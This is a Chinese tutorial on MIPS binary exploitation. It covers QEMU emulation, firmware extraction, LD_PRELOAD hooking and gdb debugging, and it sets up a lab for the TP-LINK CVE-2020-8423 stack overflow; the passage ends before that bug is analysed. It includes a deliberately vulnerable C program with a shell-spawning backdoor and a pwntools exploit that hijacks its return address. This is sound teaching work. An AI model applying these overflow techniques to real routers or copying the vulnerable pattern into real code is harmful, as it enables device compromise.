> 原文链接: https://www.anquanke.com//post/id/230259 


# Mips架构下漏洞分析入门


                                阅读量   
                                **174179**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01aae6ca2ba8a7ea79.jpg)](https://p3.ssl.qhimg.com/t01aae6ca2ba8a7ea79.jpg)



Mips架构下二进制漏洞入门笔记，最后调试TP-LINK路由器的一个栈溢出漏洞作为练习。内容较多，请耐心阅读。



## 环境搭建

搭建环境：Ubuntu

**工具安装**

SquashFS：用于Linux内核的只读文件系统

```
sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
sudo git clone https://github.com/devttys0/sasquatch
cd sasquatch &amp;&amp; sudo ./build
```

Binwalk:貌似是目前唯一可靠的解bin包的工具。

```
sudo apt-get install binwalk
```

Ghidra:NAS开源的反汇编工具

安装java环境，直接运行ghidraRun.bat(Windows)或者ghidraRun(Linuxs / Mac OS)，中途会要求jdk路径（/usr/libexec/java_home -V 获取jdk路径）

```
sudo ./ghidraRun
```

[官网下载](https://www.ghidra-sre.org/)

简单体验了一下这个工具，比起IDA这个工具在函数和变量自动命名上更加有条理，并且反汇编和伪代码自动对应功能用起来也更方便。最重要的是可以反汇编Mips！

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c9b38727e7f71b3e.png)

**环境安装**

Qemu安装

```
sudo apt-get install qemu
```

交叉编译环境buildroot

```
sudo apt-get install libncurses5-dev patch
wget http://buildroot.uclibc.org/downloads/snapshots/buildroot-snapshot.tar.bz2
tar -jxvf buildroot-snapshot.tar.bz2
cd buildroot/
make clean
make menuconfig
sudo make
```

进入menuconfig之后，选择目标架构Mips32（需要注意mips包含大端mips和小端mipsel）。配置结束之后使用make编译工具链即可。

[![](https://p5.ssl.qhimg.com/t011f171bc66679b0eb.png)](https://p5.ssl.qhimg.com/t011f171bc66679b0eb.png)

安装完成之后设置环境变量，在/etc/profile结尾加上

```
export PATH=$PATH:/.../buildroot/output/host/bin;
```

**编译第一个mips程序**

```
#include&lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

void backdoor()`{`
     system("/bin/sh");
`}`

void has_stack(char *src)
`{`
     char dst[20]=`{`0`}`;
     strcpy(dst,src);
     printf("copy successfully");
`}`

void main(int argc,char *argv[])
`{`
     has_stack(argv[1]);
`}`
```

默认编译小端程序。注意需要加`-static`**静态编译**，因为我们qemu运行环境并没有包含C标准库。

```
$ mipsel-linux-gcc vuln.c -o vuln -static
$ file vuln
vuln: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped
```

编译大端程序。需要加-EB参数，但是仅仅加-EB会导致ld报错，主要原因是ld也需要加-EB参数。所以我们需要编译和链接分开。如果要编译成共享库，上下加上-shared参数。（ld时还是存在问题）

```
$ mipsel-linux-gcc -EB -c -static  vuln.c -o vuln.o 
$ mipsel-linux-ld vuln.o -EB -o vuln
```

使用qemu-mipsel运行我们的小端程序

```
$ qemu-mipsel vuln "123"
copy successfully
```

大端程序可以用H4lo师傅的工具链构造mips[编译环境](https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/cross_compile%E7%8E%AF%E5%A2%83),在里面找到了用apt就能直接安装的交叉编译工具链，以后也不用自己编译了！

```
sudo apt-get install linux-libc-dev-mipsel-cross
sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross
sudo apt-get install binutils-mipsel-linux-gnu
sudo apt-get install gcc-$`{`VERSION`}`-mipsel-linux-gnu g++-$`{`VERSION`}`-mips-linux-gnu
```

用mips-linux-gnu-gcc编译大端程序

```
$ mips-linux-gnu-gcc vuln.c -o vuln -static
$ file vuln
vuln: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a940ead4f05cbe960bbd685229c01695ef7cea38, not stripped
```

**（*）Qemu运行Mips Linux内核**

[https://people.debian.org/~aurel32/qemu/mips/](https://people.debian.org/~aurel32/qemu/mips/) 下载两个包

vmlinux内核文件和debian镜像（建议挂代理，否则很慢），建议使用3.2版本内核，老版本内核在gdbserver远程调试时会出现一些问题。并且请注意你下载的是mips还是mipsel版本。

```
#wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
```

使用qemu运行mips debian，账号和密码都是root。

Qemu有主要如下两种运作模式，User Mode和System Mode。

Qemu系统模式命令如下

[![](https://p3.ssl.qhimg.com/t012dd195f031df4f23.png)](https://p3.ssl.qhimg.com/t012dd195f031df4f23.png)

```
$ sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:0c:29:ee:39:39 -net tap -nographic
```

**调试路由器固件的运行环境**

测试固件版本：:DIR-605L A1 FW v1.13 [下载地址](https://tsd.dlink.com.tw/ddgo)

首先用binwalk解包官网下载的固件DIR605LA1_FW113b06.bin

```
binwalk -e DIR605LA1_FW113b06.bin
```

搜索boa（web服务程序）并且使用qemu-mips运行。首先复制qemu-mips到当前目录，然后用chroot设置根目录，然后用qemu-mips运行boa。不过出现了Not a direcotry的问题，这里需要用qemu-mips-static来运行。

```
$ cp $(which qemu-mips) ./
$ sudo chroot qemu-mips ./squashfs-root-0/bin/boa
chroot: cannot change root directory to 'qemu-mips': Not a directory

安装qemu-mips-static
sudo apt-get install qemu binfmt-support qemu-user-static

改用qemu-mips-static运行
/squashfs-root-0$ cp $(which qemu-mips) ./
/squashfs-root-0$ sudo chroot . ./qemu-mips-static ./bin/boa
Initialize AP MIB failed!
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault (core dumped)
```

运行web服务的/bin/boa程序发生段错误，提示`Initialize AP MIB failed!`

通过file文件和你想分析，我们可以知道boa文件动态链接到uclibc链接库，uclibc是应用于嵌入式设备的一种小型C运行库，free和malloc的实现和glibc有一定区别，利用手法也有一些不同，当然这是后话暂且不表。

```
$ file ./bin/boa
./bin/boa: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, corrupted section header size
```

在Ghidra中搜索`Initialize AP MIB failed!`,当apmid_init()执行失败了之后就会返回0，导致Web服务启动失败。经过分析apmid_init()来自于动态链接库apmid.so，来自文件根目录下的lib文件夹。又因为,apmid_init()对于我们的测试并没有决定性影响，所以可以考虑用hook的方式，强制让apmid_init()函数值返回1。

```
iVar1 = apmib_init();
  if (iVar1 == 0) `{`
    puts("Initialize AP MIB failed!");
  `}`
```

使用[LD_PRELOAD](https://www.cnblogs.com/net66/p/5609026.html)来Hook函数，首先编写如下代码，并且编译成动态共享库。

```
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int apmib_init()
`{`
        printf("hook apmib_init()\n");
        return 1;
`}`
```

```
mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so
```

> <p>-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，<br>
则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意<br>
位置，都可以正确的执行</p>

运行时设置环境变量LD_PRELOAD(优先加载)=”/apmib-ld.so”，但是运行又出了一点问题。

```
$ sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD="./apmib-ld.so" ./bin/boa
./bin/boa: can't load library 'libc.so.6'
```

默认链接库名为libc.so.6，所以我们这里尝试去复制uclibc的libc.so.0，再次运行，发现hook成功了。当然我发现使用LD_PRELOAD=”libc.so.0”参数也可以解决问题。这里大家可以举一反三一下，思考如何将动态链接的mips elf（我们之前都是编译的静态链接程序）通过qemu的user mode运行起来？

```
cp lib/libc.so.0 lib/libc.so.6
$ sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD="./apmib-ld.so" ./bin/boa
hook apmib_init()
Create chklist file error!
Create chklist file error!
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
Segmentation fault (core dumped)
```

或者

```
sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD="./libc.so.0 ./apmib-ld.so" ./bin/boa
```

不过还是报了两个错，接下来只需要按照原理的思路，继续去分析，写出最终的链接库版本。

```
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#define MIB_IP_ADDR 170
#define MIB_HW_VER 0x250
#define MIB_CAPTCHA 0x2c1 

int apmib_init()
`{`
    printf("hook apmib_init()\n");
    return 1;
`}`
int fork(void)
`{`
    return 0;
`}`
void apmib_get(int code,int* value)
`{`
    switch(code)
    `{`
        case MIB_HW_VER:
            *value = 0xF1;
            break;
        case MIB_IP_ADDR:
            *value = 0x7F000001;
            break;
        case MIB_CAPTCHA:
            *value = 1;
            break;
    `}`
    return;
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01928f1cafeca00ff3.png)

[QEMU chroot进行本地固件调试](https://cloud.tencent.com/developer/article/1552161)

**漏洞相关**

**pwntools**是一个CTF框架和漏洞利用开发库。它是用Python编写的，旨在用于快速原型开发和开发，旨在使漏洞利用程序编写尽可能简单。[pwntools官网](http://docs.pwntools.com/en/stable/index.html)

**Gdb-Multiarch** :能够调试多个架构（包括Mips）的gdb调试工具

```
apt-get install gdb-multiarch
```

安装peda插件

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit
```

安装pwndbg插件，安装完成之后进入vim ~/.gdbinit将修改插件为pwndbg

```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

**gdbserver（mips）**

可以自己编译mips版本的也可以下载别人编译好的[mips版本gdbserver](https://github.com/rapid7/embedded-tools)。

```
git clone https://github.com/rapid7/embedded-tools.git
git clone https://github.com/hugsy/gdb-static
git cloen https://github.com/akpotter/embedded-toolkit
```

**qemu和gdb调试**

用户模式调试

```
$ qemu-mipsel -g 9000 vuln
$  gdb-multiarch -q
(gdb) target remote 127.0.0.1:9000
```

**gdb命令**

因为mips架构下peda插件无法正常运行，所以需要复习一下gdb的一些基础命令

```
break 下断点
delete 删除断点
continue 运行到下一个断点
backtrace 回溯堆栈调用信息
info 输出信息 比如 info f输出frame信息，info locals输出当前栈所有局部变量 info registers输出寄存器内容

输出命令x/20i
输出数据（64位格式）x/20xw
输出数据（32位格式）x/20xg
```

**[ROPgadgets](https://github.com/JonathanSalwan/ROPgadget)**

```
$ git clone https://github.com/JonathanSalwan/ROPgadget.git &amp;&amp; cd ROPgadget
$ sudo pip install capstone
$ python setup.py install
$ ROPgadget
```

**[Mipsrop](https://github.com/tacnetsol/ida/blob/master/plugins/mipsrop/mipsrop.py)**

将下载好的python脚本放入ida的plugins目录

```
https://github.com/tacnetsol/ida/blob/master/plugins/mipsrop/mipsrop.py
https://github.com/SeHwa/mipsrop-for-ida7 #ida7
```

[![](https://p0.ssl.qhimg.com/t01e580746421972494.png)](https://p0.ssl.qhimg.com/t01e580746421972494.png)



## MIPS指令集

**简介：MIPS**是一种采取精简指令集（RISC）的指令集架构，是一种高性能的嵌入式CPU架构，广泛被使用在许多电子产品、网络设备、个人娱乐设备与商业设备上（比如龙芯），在路由器领域也被广泛应用。

**Mips常用命令**

|命令|格式|用途
|------
|lw|lw R1, 0(R2)|从存储器中读取一个word存储（Load）到register中
|sw|sw R1, 0(R2)|把一个word从register中存储（store）到存储器中
|addiu|addiu R1,R2,#3|将一个立即数#3加上R2内容之后存放到目标地址R1
|or|or R1,R2,R3|两个寄存器内容相或
|jalr|jalr R1|使用寄存器的跳转指令

这里只列举了部分比较典型的几类指令，不过已经足够理解Mips的栈溢出了。

**Mips下寄存器的功能**

|REGISTER|NAME|USAGE
|------
|`$0`|`$zero`|常量0(constant value 0)
|`$1`|`$at`|保留给汇编器(Reserved for assembler)
|`$2-$3`|`$v0-$v1`|函数调用返回值(values for results and expression evaluation)
|`$4-$7`|`$a0-$a3`|函数调用参数(arguments)
|`$8-$15`|`$t0-$t7`|暂时的(或随便用的)
|`$16-$23`|`$s0-$s7`|保存的(或如果用，需要SAVE/RESTORE的)(saved)
|`$24-$25`|`$t8-$t9`|暂时的(或随便用的)
|`$28`|`$gp`|全局指针(Global Pointer)
|`$29`|`$sp`|堆栈指针(Stack Pointer)
|`$30`|`$fp`|帧指针(Frame Pointer)
|`$31`|`$ra`|返回地址(return address)

**MIPS特点：**
- MIPS和MIPSEL是两种架构MIPS是大端序、MIPSEL是小端序。一般来说大端序列是主流的（和x86和arm相反），不过很多CTF题目都是小端序的。（大端调试需要在gdb和pwntools都特别设置，否则默认小端）
- 不支持NX（即使编译选项添加了也没有用）不支持NX即函数的栈/bss都是可执行的，当我们的写入栈中的shellcode能够被执行，大大降低了利用难度。
<li>叶子函数和非叶子函数
<ul>
- 在MIPS体系架构下，函数分为叶子函数和非叶子函数。MIPS函数的调用过程与x86不同，x86中函数A调用函数B时，会将A函数的地址压入堆栈中，等到函数B执行完毕返回A函数时候，再从堆栈中弹出函数A的地址。而MIPS中，如果是**叶子函数**，与x86是不同的，函数的返回地址是不会压入栈中的，而是会直接存入寄存器**$ra**中。如果是**非叶子函数（即函数中还调用了其他函数）**，则和x86类似，将地址存入栈中。
- 另外Mips是没有栈底指针的，只有一个$sp指向栈顶，并且不会像x86那样通过pop或者push调整指针，而是采用**偏移寻址**来访问变量。非叶子函数如图所示，在函数头部会将调用函数的返回地址即**$ra**存放在栈底（偏移4字节），而在函数快结束时会重新将该值取去出来，放入ra。在这个间段内，如果覆盖了函数栈底，就能够控制程序的流程。
[![](https://p1.ssl.qhimg.com/t011d399500a1145ba6.png)](https://p1.ssl.qhimg.com/t011d399500a1145ba6.png)

​ 而在叶子函数如下图所示，从函数被调用开始到函数jr ra返回调用函数，数据一直都在**$ra**寄存器中，所以理论上是无法利用的。但是如果缓冲区溢出的足够多，足够越过本函数的栈底，直到覆盖到调用函数的栈底，那么也是能够利用的。

[![](https://p0.ssl.qhimg.com/t016c8ff8d5285c6e02.png)](https://p0.ssl.qhimg.com/t016c8ff8d5285c6e02.png)

```
mov $a0,$s2
jalr strrchr   //arg $a0
mov $a0,$s0
```

**栈溢出实例**

还是用我们一开始的vuln程序进行溢出

qemu运行

```
qemu-mipsel -g 9000 vuln aaaaaa
```

gdb远程调试

```
$ qemu-mipsel -g 9000 vuln
$  gdb-multiarch -q
(gdb) target remote 127.0.0.1:9000
```

对has_stack函数下断点。首先查看strcpy的两个参数，首先是strcpy的src，`lw a1,56(s8)`即从s8寄存器（实际上值和sp是相同的，都是指向栈顶）数据偏移56（+56）的数据写入寄存器a1，即通过s8+56偏移可以获得地址0x76fff2c7，这个地址即存放我输入的aaaa数据。然后我们来看dest，即发生写入的地址，这个参数默认被放在a0里，即s8偏移24位。这样我们就能够计算需要多少数据能覆盖缓冲区了。

[![](https://p1.ssl.qhimg.com/t0196648eab9ceef378.png)](https://p1.ssl.qhimg.com/t0196648eab9ceef378.png)

[![](https://p3.ssl.qhimg.com/t017a4e5293b5546013.png)](https://p3.ssl.qhimg.com/t017a4e5293b5546013.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012661d3de8b5f68f7.png)

然后让我们运行到strcpy结束，能够看到我们写入的数据（sp偏移24）。而我们知道返回地址是sp偏移4位，因为这条汇编代码 `004003e8 34 00 bf af     sw         ra,local_4(sp)`，所以我们只需要写入20+4字节数据就能覆盖返回地址。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f66d39cdf7f30e78.png)

即下图所示的位置。

[![](https://p5.ssl.qhimg.com/t01853b5d6149ea86f0.png)](https://p5.ssl.qhimg.com/t01853b5d6149ea86f0.png)

经过实际测试我们输入28+4个字节能够覆盖到返回地址，下图中也显示程序的流程被我们所控制。

[![](https://p1.ssl.qhimg.com/t0186d84b3d456f071f.png)](https://p1.ssl.qhimg.com/t0186d84b3d456f071f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017d339aef92b4d7ba.png)

接下来让我们写一个简单的exploit，运行exp就能获得shell（不过不是qemu里面的shell，而是系统的shell，这点很奇怪，也许是qemu用户模式并没有挂文件系统和内核的缘故）

```
from pwn import *

context.binary = "vuln"

back_door=0x0400390
payload=p32(0x12345678)*7+p32(back_door)

print(payload)

io=process(argv=["qemu-mipsel", "./vuln" , payload])

#context.log_level='Debug'

io.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013d439bff22544441.gif)

这里贴上一个链接，方便指令集查阅[https://blog.csdn.net/gujing001/article/details/8476685](https://blog.csdn.net/gujing001/article/details/8476685)



## CVE-2020-8423

漏洞设备：TP-LINK TL-WR841N V10

漏洞原因：栈溢出

> CVE-2020-8423是TP-LINK路由器中http服务在解析用户HTTP头中字符串没有设置正确的缓冲区大小而导致的栈溢出。

### <a class="reference-link" name="%E9%85%8D%E7%BD%AE%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"></a>配置运行环境

因为手头没有真机，所以我们选择用qemu来模拟路由器。

**Qemu System模式运行**

首先下载路由器对应版本的[固件](https://www.tp-link.com/no/support/download/tl-wr841n/v10/),然后使用binwalk对固件进行解压。

```
binwalk -Me TL-WR841N_V10_150310.zip
cd _TL-WR841N_V10_150310.zip.extracted/_wr841nv10_wr841ndv10_en_3_16_9_up_boot\(150310\).bin.extracted/squashfs-root/
```

首先我们需要桥接qemu，使得我们能够传输我们的文件系统squashfs-root到虚拟机中。这部分比较麻烦而且容易忘记，所以记录一下。启动系统用下面的命令就可以了(这个固件是32位的，请不要用64位qemu运行)。如果启动不起来或者很慢，重新下一下qcow2，可能之前的某些操作把镜像弄坏了。

```
sudo qemu-system-mips -M malta -kernel /home/migraine/Documents/vmlinux-2.6.32-5-4kc-malta -hda /home/migraine/Documents/debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic, -net tap -nographic 
#更换内核(wget https://people.debian.org/\~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta)
sudo qemu-system-mips -M malta -kernel /home/migraine/Documents/vmlinux-3.2.0-4-4kc-malta -hda /home/migraine/Documents/debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic, -net tap -nographic
映射端口 -redir tcp:80::8080
```

[![](https://p1.ssl.qhimg.com/t0177593f71e4bc2f26.png)](https://p1.ssl.qhimg.com/t0177593f71e4bc2f26.png)

**配置桥接**

我们需要将文件系统传入虚拟机中然后运行固件，为了能让qemu和宿主机传输文件，先要配置桥接网络([参考链接](https://www.cnblogs.com/pengdonglin137/p/5023340.html))

1.配置桥接网卡

安装bridge-utils和uml-utilities

```
sudo apt-get  install bridge-utils
sudo apt-get install uml-utilities
```

然后修改/etc/network/interfacces为

```
auto lo
iface lo inet loopback
auto eth0
iface eth0 inet manual
up ifconfig eth0 0.0.0.0 up
auto br0
iface br0 inet dhcp
bridge_ports eth0
bridge_stp off
bridge_maxwait 1
```

编辑/etc/qemu-ifup，使qemu在启动中自动将网卡(Default:tap0/tap1)加入到桥接网卡。这是关键的一步。

```
#!/bin/sh
echo "Executing /etc/qemu-ifup"
echo "Bringing up $1 for bridged mode..."
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
echo "Adding $1 to br0..."
sudo /sbin/brctl addif br0 $1
#sudo ifconfig br0 10.211.55.6/24
sleep 3
```

重启后我们主机的ip会多一个桥接。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0148ca873c2d195367.png)

2.配置桥接网卡的地址

接着让我们设置桥接的地址。比如我目前宿主机（运行在parralell下）的地址是10.211.55.5，所以我使用命令 `ifconfig br0 10.211.55.6/24 up` 修改桥接网卡(或者在etc/qemu-ifup中加上`sudo ifconfig br0 10.211.55.6/24` ，这样只要qemu开启就会自动设置br0)。

然后我们在qemu中也用ifconfig设置ip为10.211.55.7/24，这样宿主机和qemu就能够相互ping通了。（只要在同一网段即可）

```
#在虚拟机内部
ifconfig eth0 10.211.55.7/24 up
#在虚拟机外部(设置桥接)
ifconfig br0 10.211.55.6/24 up
```

**需要注意的是：要保证qemu内的ip子网掩码和桥接网卡一致，否则虽然宿主机和qemu都可以访问桥接网卡，但是两者不能相互通信。**

[![](https://p3.ssl.qhimg.com/t01d568e70457a3117d.png)](https://p3.ssl.qhimg.com/t01d568e70457a3117d.png)

尝试去ping宿主机。然后通过scp来传输文件。

```
root@debian-mips:~# ifconfig eth0 10.211.55.7/24 up
root@debian-mips:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:ee:39:39  
          inet addr:10.211.55.6  Bcast:10.211.55.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:feee:3939/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:2862 (2.7 KiB)
          Interrupt:10 Base address:0x1020
#将文件系统传入qemu虚拟机
scp -r squashfs-root/ root@10.211.55.7:~/
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a0adb7754dd3dc9f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t018adfc09cb22e7436.png)

传输文件，然后在qemu中就能看到我们传输的文件了。

```
sshpass -p root  scp -r squashfs-root/ root@10.211.55.7:~/
```

[![](https://p5.ssl.qhimg.com/t01336d24b5cafbc870.png)](https://p5.ssl.qhimg.com/t01336d24b5cafbc870.png)

[![](https://p3.ssl.qhimg.com/t016f6afdc96402dae0.png)](https://p3.ssl.qhimg.com/t016f6afdc96402dae0.png)

**挂载固件的文件系统**

挂载系统的proc到我们固件目录下的[proc](https://zhuanlan.zhihu.com/p/26923061).这样我们的程序在访问一些内核信息时候能够读取到，否则程序可能会运行错误。

```
# 挂载文件系统
mount --bind /proc squashfs-root/proc
# 更换root目录
chroot . bin/sh
```

[![](https://p0.ssl.qhimg.com/t010a2aa43e27239129.png)](https://p0.ssl.qhimg.com/t010a2aa43e27239129.png)

```
/usr/bin/httpd
```

运行会报很多错误，参考H4lo师傅的方法hook一下函数来解决问题。将我们编译好的链接库通过scp传入到Qemu虚拟机中。

```
#mips-linux-gnu-gcc -shared -fPIC hook.c -o hook
#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
int system(const char *command)`{`
    printf("HOOK: system(\"%s\")",command);
    return 1337;
`}`

int fork(void)`{`
    return 1337;
`}`
```

重新运行，遇到`/usr/bin/httpd: can't load library 'libc.so.6`这种问题，使用软链接解决即可。

```
# 挂载文件系统
$ mount --bind /proc squashfs-root/proc
# 更换root目录
$    cd squashfs-root/
$ chroot . bin/sh

$ LD_PRELOAD="/hook" /usr/bin/httpd
$ /usr/bin/httpd: can't load library 'libc.so.6'
$ ln -s  libc.so.0  libc.so.6
$ LD_PRELOAD="/hook" /usr/bin/httpd

#gdb调试
export LD_PRELOAD="/hook"
#./gdbserver-7.12-mips-be 0.0.0.0:2333  /usr/bin/httpd #这个版本的gdb挂起有点问题
./gdbserver.mipsbe  0.0.0.0:2333  /usr/bin/httpd
```

[![](https://p1.ssl.qhimg.com/t018de95c8f3231460f.png)](https://p1.ssl.qhimg.com/t018de95c8f3231460f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016932a6c94490a064.png)

进入Web后台界面时候，登陆账号（账号密码都是admin）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0142602b14ff574623.png)

**其他问题**
<li>设置桥接之后主机无法联网的问题初始化网桥时候将dns给删了,添加一下dns即可。修改文件 **/etc/resolvconf/resolv.conf.d/base**
<pre><code class="hljs css">nameserver 8.8.8.8
nameserver 8.8.4.4
</code></pre>
执行更新
<pre><code class="hljs nginx">resolvconf -u
</code></pre>
</li>
<li>ssh或者scp报错`Unable to negotiate with 10.211.55.8 port 22: no matching host key type found. Their offer: ssh-dss`添加参数`-oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1`,比如：
<pre><code class="lang-shell hljs">$ ssh [root@10.211.55](mailto:root@10.211.55).8 -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1
$ sshpass -p root  scp -oHostKeyAlgorithms=+ssh-dss -oKexAlgorithms=+diffie-hellman-group1-sha1 gdbserver-7.12-mips-be [root@10.211.55](mailto:root@10.211.55).8:~/
</code></pre>
</li>
**gdb调试**

使用scp将gdbserver拷贝到squashfs-root目录下

```
scp r gdbserver.mipsbe root@10.211.55.7:~/squashfs-root/
```

使用gdbserver将httpd调试转发到2333端口

```
export LD_PRELOAD="/hook"
./gdbserver-7.12-mips-be 0.0.0.0:2333  /usr/bin/httpd
```

宿主机的gdb通过remote target进行远程调试。如果报错`Remote replied unexpectedly to 'vMustReplyEmpty': timeout`。需要将内核版本从vmlinux-2.6.32-5-4kc-malta更换为[vmlinux-3.2.0-4-4kc-malta](//people.debian.org/%5C~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t013f9df1cbd1a5b27a.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

